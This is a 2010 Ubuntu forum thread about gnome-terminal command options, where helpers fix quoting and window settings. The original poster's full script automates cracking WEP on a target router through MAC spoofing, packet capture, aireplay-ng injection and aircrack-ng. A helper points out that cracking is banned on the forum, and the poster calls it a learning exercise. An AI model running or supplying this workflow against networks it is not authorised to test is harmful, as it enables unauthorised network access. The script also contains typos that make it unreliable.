---
title: "gnome-terminal"
date: 2010-01-08
forum: New to Ubuntu
---

### Post by Sailing Bud on 2010-01-08
I am running Ubuntu Ver. 9.10 with Terminal 2.28.1
 
I have two commands in a script that I am in an attempt to write and I can not figure out why they won't work. They are:
 
gnome-terminal --execute; --hide-menubar; --geometry=120x25+20+10; --title=Window 1
 
and the other, very similar
 
gnome-terminal --command=sudo aireplay-ng -1 0 -a $varable1 -e $varable2 -h $varable3 $varable 4; --hide-menuebar; --geometry=110x25+45+20; --title=Aire Play - N0. 2
 
A terminal window will not open and there are several errors dealing with the options called.
 
Any and all help will be greatly appricated.
Thank You in advance,
Sailing Bud

---

### Post by ajgreeny on 2010-01-08
The command does not need, and makes the errors because of the "--execute" part, nor, as far as I can make out, the semicolons.

Remove those from the command and it works partly, at least, though it doesn't seem to make the window title.

---

### Post by J V on 2010-01-08
What he said, only the window title should be `--title "Window 1"`

$variable... will only work in a script, this isn't in a script I presume, therefore they aren't valid values...

Should be something like this:
```
gnome-terminal --execute "gedit" --hide-menubar --geometry=120x25+20+10 --title "Window 1"
 gnome-terminal --command="sudo aireplay-ng -1 0 -a $varable1 -e $varable2 -h $varable3 $varable 4" --hide-menuebar --geometry=110x25+45+20 --title "Aire Play - N0. 2"
```

---

### Post by Sailing Bud on 2010-01-08
Thanks for the support so far . . . . .
 
For the first window:
Removing the semicolons did help immensely.
Removing the execute allowed the script to run, but not in the correctly sized and in the proper location window. It used the first window which was small and in the incorrect location. 
 
The Second Window:
Also removed the semicolons and moved the "--command=" to the line previous, and on a second try to the line after the window generating and the command. In both cases the window was generated of the correct size and in the correct location but, the new window remained blank and nothing happened in the new window. All of the functions occurred in the original window.
 
Also:
The Title in both Windows was only paritially correct in the the Text was correct but was appended with the the command line text.
 
Still Trying,
Sailing Bud

---

### Post by J V on 2010-01-08
paste us the commands you are using now...

---

### Post by Sailing Bud on 2010-01-08
This was generated in "Gedit" with Text wrap turned off and line numbering turned on.
The two lines that I am talking about are # 6 and # 88.  I will be doing this at other locations in this script, once I learn how to do it.

Considering most of the knowledge that I have is from Excel programing I think that I am doing quite well.

As always, your help is immensely appreciated. 

I just noticed that all of the spacing is gone, so it will probably not look to pretty.  If you want, I can compress the script file and send it.

Sailing Bud


#!/bin/bash
# crackit.sh: Crack-It for using "Air Crack" cracking WEP Encryption.                           # Name of this Script
# -----------------------------------------------------------------------------------------     # Separator
#                                        Opening Program                                        # Program Comments
# -----------------------------------------------------------------------------------------     # Separator
gnome-terminal --execute --hide-menubar --geometry=120x25+20+10 --title "First Window"            # Open Terminal Window at a Specific Location and Size.
cd /                                                                                            # CD to 
clear                                                                                           # Clear Screen
echo "This script is to automatically run the 'AirCrack' procedure to "                         # Text
echo "crack 'WEP' protection for wireless routers"                                              # Text
echo "with minimum input from the operator and assistance from the screen."                     # Text continue
echo ""                                                                                         # Blank Line
echo "Press Cntl + C to stop at any time."                                                      # Text
echo ""                                                                                         # Blank Line
read -s -n 1 -p "Press any key to continue."                                                    # Pause command
# -----------------------------------------------------------------------------------------     # Separator
#                      Preparing to Obtaining Information from Target                          # Program Comments
# -----------------------------------------------------------------------------------------     # Separator
clear                                                                                           # Clear Screen
sudo airmon-ng                                                                                  # Airmon command
read -p "Please Enter the USB Adapter name in the Interface column for WIFI Adapter and press [ENTER]: " var_adapter_1     # Enter USB to WIFI adapter's name
echo ""                                                                                         # Blank Line
echo "This USB to WIFI Adapter's name is: $var_adapter_1"                                       # Confirming name
echo ""                                                                                         # Blank Line
read -s -n 1 -p "Press any key to continue."                                                    # Pause command
clear                                                                                           # Clear Screen
sudo airmon-ng stop $var_adapter_1                                                              # Airmon command
sudo ifconfig $var_adapter_1 down                                                               # IfConfig stop command
sudo macchanger -m 00:11:22:33:44:55 $var_adapter_1                                             # MAC Changer command
sudo airmon-ng start $var_adapter_1                                                             # Airmon restart command
echo ""                                                                                         # Blank Line
read -p "Please Enter the New USB Adapter name in the Interface column for WIFI Adapter and press [ENTER]: " var_adapter_2   # Enter the new name for the USB to WIFI adapter's name
echo ""                                                                                         # Blank Line
echo ""                                                                                         # Blank Line
echo "This WIFI adapter's New name has changed to: $var_adapter_2"                              # Confirming New Name
echo ""                                                                                         # Blank Line
echo ""                                                                                         # Blank Line
read -s -n 1 -p "Press any key to continue:"                                                    # Pause command
# -----------------------------------------------------------------------------------------     # Separator
#                                Obtaining Information from Target                              # Program Comments
# -----------------------------------------------------------------------------------------     # Separator
sudo airodump-ng $var_adapter_2                                                                 # Air O Dump command
echo ""                                                                                         # Blank Line
echo ""                                                                                         # Blank Line
echo "" # Need a Ctrl-C here to stop the "Air O Dump" command.                                  # Stop Air O Dump command
echo "Copy and Past the Correct Information from the Screen Above"                              # Instruction
echo ""                                                                                         # Blank Line
read -p "Please Enter Targets Channel # and press [ENTER]: . . . . . . . . " var_t_channel      # Enter Target's Channel No.
echo ""                                                                                         # Blank Line
read -p "Please Enter Targets MAC Address [bssid] and press [ENTER]: . . . " var_t_mac          # Enter Target's MAC No.
echo ""                                                                                         # Blank Line
read -p "Please Enter Target's Broadcasts name [essid] and press [ENTER]: . " var_t_name_L       # Enter Target's SSID Name
# -----------------------------------------------------------------------------------------     # Separator
#                           Confirming Information About Target                                 # Program Comments
# -----------------------------------------------------------------------------------------     # Separator
clear                                                                                           # Clear Screen
echo ""                                                                                         # Blank Line
echo ""                                                                                         # Blank Line
echo "                 The USB to WIFI adaptors original name was: $var_adapter_1"              # Confirming Old Name
echo "                                             and"                                         # Text continue
echo " the name changed to after the Mac Changer command above is: $var_adapter_2"              # Confirming New Name
echo ""                                                                                         # Blank Line
echo "        The Targets Channel Number is:                       $var_t_channel"              # Confirming Channel #
echo ""                                                                                         # Blank Line
echo "   The Targets MAC Address 'bssid' is:                       $var_t_mac"                  # Confirming MAC Address
echo ""                                                                                         # Blank Line
echo "The Targets Broadcast Name 'essid' is:                       $var_t_name_L"               # Confirming SSID
echo ""                                                                                         # Blank Line
# -----------------------------------------------------------------------------------------     # Separator
#                            Modifying Target's Name for File Name                              # Program Comments
# -----------------------------------------------------------------------------------------     # Separator
if [ "${var_t_name_L::5}" = "4Wire" ]                                                           # Start of If-Then_Else to separate Target's SSID name of
   then var_t_name_S=Wi${var_t_name_L:5}-02.cap                                                 # "4Wire???" from a real name and concatenates the name into 
   else var_t_name_S=${var_t_name_L::5}-01.cap                                                  # a formated file name.
fi                                                                                              # end of If-Then_Else
echo "   This will be the Targets File Name:                       $var_t_name_S"               # Confirming File Name
# -----------------------------------------------------------------------------------------     # Separator
#                                  Obtaining Data Packets                                       # Program Comments
# -----------------------------------------------------------------------------------------     # Separator
echo ""                                                                                         # Blank Line
echo ""                                                                                         # Blank Line
read -s -n 1 -p "Press any key to continue . . ."                                               # Pause command
sudo airodump-ng -c $var_t_channel -w $var_t_name_L --bssid $var_t_mac $var_adaptor_2           # Air O Dump command
# -----------------------------------------------------------------------------------------     # Separator
#                               Obtaining WEP Encryption Key                                    # Program Comments
# -----------------------------------------------------------------------------------------     # Separator
# . . . Open Window [Number 2] . . . Terminal Window                                            # Program Instruction
gnome-terminal --command="sudo aireplay-ng -1 0 -a $var_t_mac -e $var_T_name_L -h 00:11:22:33:44:55 $var_adapter_2" --hide-menubar --geometry=110x25+45+20 --title "Aire Play - No. 2"  #AirRePlay Command 
$var_adapter_2
echo ""                                                                                         # Blank Line
echo ""                                                                                         # Blank Line
echo "Should get a Smiley Face - Smilley"                                                           # Instruction
read -s -n 1 -p "Press any key to continue . . ."                                               # Pause command
# . . . Open Window [Number 3] . . . Terminal Window                                            # Program Instruction
replay-ng -3 -b $var_t_mac -e $var_t_name_L -h 00:11:22:33:44:55 $var_adapter_2                 # AirePlay command
echo " . . . Go back to Window 2 and re-run command to get Smiley Face . . ."                   # Instruction
sudo aireplay-ng -1 0 -a $var_t_mac -e $var_T_name_L -h 00:11:22:33:44:55 $var_adapter_2        # AirePlay command
echo " . . . Go back to Window 3 and re-run command . . ."                                      # Instruction
sudo airreplay-ng -3 -b $var_t_mac -e $var_t_name_L -h 00:11:22:33:44:55 $var_adapter_2         # AirePlay command
read -s -n 1 -p "Press any key to continue . . ."                                               # Pause command
echo ""                                                                                         # Blank Line
echo "At least 10,000 Packets of Datga and Quanity of Data Packets are Increasing rapidlly."    # Instruction
sudo aircrack-ng -b $var_t_mac $var_t_name_S-01.cap                                             # Air Crack command
echo ""                                                                                         # Blank Line
echo ""                                                                                         # Blank Line
read -s -n 1 -p "                You Are Done . . . Press any key to finish . . ."              # Pause command
exit                                                                                            # Finish

---

### Post by J V on 2010-01-08
You're doing great for someone who used to do excel :)

Could you put [ code ][ /code ] around your text (without spaces)? makes it look nice :)

And gedit will never actually wrap, only when displaying it, feel free to wrap :)

Ahh, so the first line should open a terminal where the rest of the script will run from yes?

We're gonna need multiple files (or a very long command to start it)

```
sudo gnome-terminal --execute "./restofscript.sh" --hide-menubar --geometry=120x25+20+10 --title "First Window"
```Then restofscript.sh contains the rest of this script

```
gnome-terminal --execute "sudo aireplay-ng -1 0 -a $var_t_mac -e $var_T_name_L -h 00:11:22:33:44:55 $var_adapter_2" --hide-menubar --geometry=110x25+45+20 --title "Aire Play - No. 2" #AirRePlay Command
```Do these work?

Oh **** I just realised, cracking is like, forbidden on these forums :P

Unless you are just doing this as an excersise?

---

### Post by Sailing Bud on 2010-01-08
You are correct, This is ONLY for learning.  I did not know that this was frounded on so I will have to start all over so as not to upset the Big ones.
 
 
1.) I do not understand this comment . . . .
Could you put [ code ][ /code ] around your text (without spaces)? makes it look nice 
2.) I prefer "Q-Edit" from the old days but I don't know if they have anything for Lynix.
And gedit will never actually wrap, only when displaying it, feel free to wrap

3.) Company just arrived from up North so I will be away from the computer for a little bit, then I will tyr these.
Ahh, so the first line should open a terminal where the rest of the script will run from yes?

4.) I was attempting to keep this all one file for portability.  If necessary I could segment it . . .  argggg.
We're gonna need multiple files (or a very long command to start it)

Sailing Bud

---

### Post by J V on 2010-01-08
> **Sailing Bud said:**
> 1.) I do not understand this comment . . . .
Could you put [ code ][ /code ] around your text (without spaces)? makes it look nice 
its bbcode, makes things look like code

> 2.) I prefer "Q-Edit" from the old days but I don't know if they have anything for Lynix.
And gedit will never actually wrap, only when displaying it, feel free to wrapNever heard of it, have a little script of my own that should setup gedit quite nicley from a programmers point of view:
```
sudo apt-get install gedit-plugins
gconftool-2 --type list --list-type string --set /apps/gedit-2/plugins/active-plugins [filebrowser,spell,docinfo,time,codecomment,externaltools,joinlines,sessionsaver,terminal,devhelp,indent,modelines]
gconftool-2 --type bool --set /apps/gedit-2/preferences/ui/bottom_panel/bottom_panel_visible true
gconftool-2 --type int --set /apps/gedit-2/preferences/ui/recents/max_recents 20
gconftool-2 --type bool --set /apps/gedit-2/preferences/ui/side_pane/side_pane_visible true
gconftool-2 --type bool --set /apps/gedit-2/preferences/syntax_highlighting/enable true
gconftool-2 --type bool --set /apps/gedit-2/preferences/editor/auto_indent/auto_indent true
gconftool-2 --type bool --set /apps/gedit-2/preferences/editor/bracket_matching/bracket_matching true
gconftool-2 --type bool --set /apps/gedit-2/preferences/editor/current_line/highlight_current_line true
gconftool-2 --type bool --set /apps/gedit-2/preferences/editor/line_numbers/display_line_numbers true
gconftool-2 --type bool --set /apps/gedit-2/preferences/editor/right_margin/display_right_margin true
gconftool-2 --type bool --set /apps/gedit-2/preferences/editor/save/auto_save true
gconftool-2 --type bool --set /apps/gedit-2/preferences/editor/search_highlighting/enable true
gconftool-2 --type bool --set /apps/gedit-2/preferences/editor/tabs/insert_spaces true
gconftool-2 --type int --set /apps/gedit-2/preferences/editor/tabs/tabs_size 4
gconftool-2 --type string --set /apps/gedit-2/preferences/editor/wrap_mode/wrap_mode "GTK_WRAP_WORD"
```> Ahh, so the first line should open a terminal where the rest of the script will run from yes?
4.) I was attempting to keep this all one file for portability.  If necessary I could segment it . . .  argggg.
We're gonna need multiple files (or a very long command to start it)

Sailing BudYou could also just run the command I said to put in the first file from the run window (or stick it in the menu etc), keeps it to one file but makes it more difficult to setup the run button... Portability has nothing to do with the number of files, that first one at least shoulden't change as long as you are on gnome...

---

### Post by ajgreeny on 2010-01-09
Just so I understand things properly, are you trying to get the system to open a terminal and then run a command in that terminal?

If so you could create a launcher on your desktop for an "application run in terminal" use the command you want to run in that command box, and then use the launcher file to start the whole thing running.  You can actually put the launcher anywhere in your file system and it will still work.

If I've got the wrong end of the stick, just ignore me;  I often try even when I'm a bit out of my depth.

---

### Post by Sailing Bud on 2010-01-09
Question - Are you trying to get the system to open a terminal and then run a command in that terminal?
 
Answer - Yes, that is exactly what I am attempting to do.


Question - If so you could create a launcher on your desktop for an "application run in terminal" 
 
Answer - This is no problem, I can and have done this already. I want to get the script to run without errors before I start to make it more complicated.
 
I am still havine problems getting up to 5 terminal windows to open and run a specific part of the script and then go back to the original part.  To date I have segimented the script into five parts, calling them in secquence.  That is not working very well because it wants to go to all five terminals at one time with out waiting for the previous one to complete.
 
Thank you for checking back to see how I am doing.
Sailing Bud

---

### Post by ajgreeny on 2010-01-10
OK, thanks for that explanation, though I'm not good enough with programming or terminal commands to help much further, other than offering the possibility of && between different sections of your original command, each one to open a new terminal after the previous one has successfully done its own work.

As you must know, I'm sure, the two && will mean that the first command (before &&) will run and if successful, the part of the command after the && will run.  What I do not know is how to open another terminal and run a command from a currently open terminal.  I hope this gives you a few ideas and things to consider further, even if it does not solve your particular problem.

---

